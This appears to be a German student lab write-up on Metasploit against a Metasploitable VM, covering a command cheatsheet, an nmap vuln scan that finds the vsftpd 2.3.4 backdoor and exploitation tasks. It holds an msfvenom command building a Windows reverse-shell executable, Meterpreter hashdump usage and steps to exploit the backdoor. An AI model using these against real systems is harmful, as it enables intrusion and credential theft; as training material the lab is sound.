# very safe FTP backdoor


## msf Basics

**Angabe:**

Probiere alle besprochenen bzw. open beschriebenen msf Befehle noch einmal aus und erstelle ein kurzes Cheatsheet zur Bedienung von metasploit.

Der Befehl setg (set global) ist in unserem Zusammenhang auch sehr praktisch, recherchiere dazu.
Recherchiere zu
msfvenom
Meterpreter

### Cheatsheet


#### Starten

* `msfconsole` → Metasploit starten

#### Suchen von Modulen

* `search ssh` → Suche nach Stichwort
* `search type:auxiliary name:ssh` → Gefilterte Suche
* `search scanner/ssh` → Suche nach Pfad

#### Modul-Infos

* `info <modul>` → Details zum Modul anzeigen

#### Modul verwenden

* `use <modul>` → Modul laden
* `options` → Zeigt benötigte Parameter

#### Wichtige Optionen setzen

* `set RHOSTS <IP/Domain>` → Ziel setzen
* `set RPORT <Port>` → Port setzen (falls nötig)

#### Ausführen

* `run` oder `exploit` → Modul starten

#### Nützliches

* `back` → Modul verlassen
* `show options` → Optionen anzeigen
* `show auxiliary` / `show exploits` → Modularten anzeigen
* `help` → Hilfe

#### Beispiele

* SSH Version:
  `use auxiliary/scanner/ssh/ssh_version`
* HTTP Title:
  `use auxiliary/scanner/http/title`




#### setg (Set Global)

* `setg <OPTION> <Wert>` → Setzt eine Variable **global** für alle Module
* Beispiel:

  * `setg RHOSTS 192.168.1.10`
  * `setg LHOST 192.168.1.5`
* `getg` → Zeigt alle global gesetzten Variablen

**Vorteil:**

* Spart Zeit, da wichtige Werte nicht in jedem Modul neu gesetzt werden müssen.

---

#### msfvenom

**Payload-Generator von Metasploit**

* Erstellt ausführbare Payloads (Backdoors, Reverse Shells, Exploits)
* Kombiniert Payload + Encoder in einer Datei

Beispiel:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
```

Typische Ausgabeformate:

* exe (Windows)
* elf (Linux)
* apk (Android)
* raw (Shellcode)

---

#### Meterpreter

**Erweiterte, interaktive Shell**

* Wird als Payload in Exploits verwendet
* Mächtiger als eine normale Shell

Wichtige Befehle:

* `sysinfo` → Systeminformationen
* `getuid` → Aktueller Benutzer
* `screenshot` → Bildschirmfoto
* `hashdump` → Passwort-Hashes (bei Rechten)
* `upload` / `download` → Dateien übertragen

---



## nmap FTP scan

**Angabe:**

Aufgabe: Wiederhole den nmap vuln scan auf den FTP Port. Verwende:

Option --script=vuln (Diese Skripte sind “intrusive” und werden daher nicht über die Optionen -sC oder -A aufgerufen.)

Option -p zum Einschränken auf den FTP Port

Findet nmap die Sicherheitslücke? Recherchiere mit Hilfe der CVE Nummer über diese Sicherheitslücke.

Recherchiere warum diese Skripte als intrusive bezeichnet werden, warum werden diese bei -sC oder -A nicht ausgeführt?

#### IP von ms: 192.168.1.51

```
$ nmap --script=vuln -p 21 192.168.2.51
```

#### Findet Nmap die Sicherheitslücke?

Ja. Der Scan hat folgende Schwachstelle gefunden:

**CVE-2011-2523 – vsFTPd 2.3.4 Backdoor**

* Betroffene Software: vsFTPd Version 2.3.4
* Art der Lücke: Absichtlich eingebaute Backdoor
* Auswirkung: Remote-Zugriff mit Root-Rechten möglich
* Risiko: Kritisch (vollständige Systemübernahme ohne Login)

Funktionsweise (vereinfacht):

* Spezieller Login-String aktiviert eine versteckte Hintertür
* Ein zusätzlicher Port wird geöffnet
* Angreifer erhält eine Root-Shell

---

#### Warum sind „vuln“-Skripte intrusive?

„Intrusive“ bedeutet: **eingreifend und aktiv angreifend**.

Diese Skripte:

* Senden gezielt schädliche Testdaten
* Versuchen Exploits auszuführen
* Können Befehle auf dem Zielsystem starten
* Können Dienste zum Absturz bringen oder verändern

Sie gehen also über reines Scannen hinaus und simulieren echte Angriffe.

---

#### Warum werden sie nicht bei -sC oder -A ausgeführt?

* `-sC` und `-A` verwenden nur **sichere Standard-Skripte**
* Diese dürfen:

  * Keine Exploits ausführen
  * Keine Systeme verändern
  * Keine Instabilität verursachen

Nmap-Grundprinzip:

> Standard-Scans sollen Informationsgewinnung ermöglichen, ohne Systeme zu gefährden.

Darum sind intrusive Skripte wie `vuln`, `exploit`, `dos` **nicht automatisch enthalten**.

---

## msf FTP Version herausfinden

**Angabe:**

In dieser Übung findest du mit Hilfe eines msf Moduls ähnliche Informationen wie mit dem vorherigen nmap scan.

Suche nach einem msf Modul mit dem die Version des FTP Servers ermittelt werden kann, du findest dies in der Kategorie scanner .

Verwende dieses Modul um die auf Metasploitable installierte FTP Version herauszufinden.

#### Codereihenfolge

```
$ msfconsole
```

```
$ search scanner ftp
```
```
$ auxiliary/scanner/ftp/ftp_version
```
```
$ use auxiliary/scanner/ftp/ftp_version
```
```
$ set RHOSTS 192.168.2.51
```

```
$ run
```

**Ausgabe:**

**Version:** FTP Banner: '220 (vsFTPd 2.3.4)'


## msf vsftpd exploit

**Angabe:**

Voraussetzung: Setze Kali und Metasploitable in den NAT Modus.

Starte metasploit aus dem Terminal mit msfconsole (metasploit framework console)

help zeigt einen Hilfetext an.

Verwende search um ein metasploit Modul zu finden dass einen exploit für diese Backdoor zur Verfügung stellt. Hinweis: Suche nach vsftpd

Aktiviere dieses Modul mit use.

Die Anzeige sollte nun so aussehen:

[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/...) > 

Verwende info um Informationen zum aktivierten Modul anzuzeigen. Lies die “Description” durch und finde heraus welche Optionen dieses Modul unterstützt und wie diese gesetzt werden müssen. Setze die notwendigen Optionen.

Verwende den Befehl run um das aktive Modul auszuführen. Es startet eine shell. Verifiziere, dass diese am Metasploit System läuft. Welche Rechte hat diese shell (welcher user)?

Hinterlasse eine Nachricht you have been hacked!die beim nächsten Einloggen dem User msfadmin automatisch angezeigt wird.

